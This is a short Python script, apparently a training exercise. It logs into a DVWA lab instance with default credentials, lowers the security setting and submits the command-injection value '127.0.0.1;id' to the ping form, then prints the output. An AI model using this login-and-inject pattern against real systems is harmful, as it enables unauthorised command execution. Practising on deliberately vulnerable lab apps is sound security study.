#!/usr/bin/env python

#https://www.pythonforbeginners.com/cheatsheet/python-mechanize-cheat-sheet
#https://www.crummy.com/software/BeautifulSoup/bs4/doc/

#login DVWA and perform Command Injection

from termcolor import colored

import mechanize

from bs4 import BeautifulSoup


#Create a browser object

br = mechanize.Browser()

#Open a webpage

response1 = br.open('http://192.168.30.143/dvwa/login.php')

#nr=0 is the first form

br.select_form(nr=0)
br.set_value("admin", name="username", nr=0)
br.set_value("password", name="password", nr=0)
br.submit()
#print br.response().read()

response2=br.open('http://192.168.30.143/dvwa/security.php')
#print response2.read()
br.select_form(nr=0)
br.set_value(['low'], name='security', nr=0)
br.submit()
#print br.response().read()

response3=br.open('http://192.168.30.143/dvwa/vulnerabilities/exec/')
#print response3.read()
br.select_form(nr=0)
br.set_value("127.0.0.1;id", name="ip", nr=0)
br.submit()

soup = BeautifulSoup(br.response().read(),'lxml')

#print soup.pre

print colored(soup.pre, 'red')
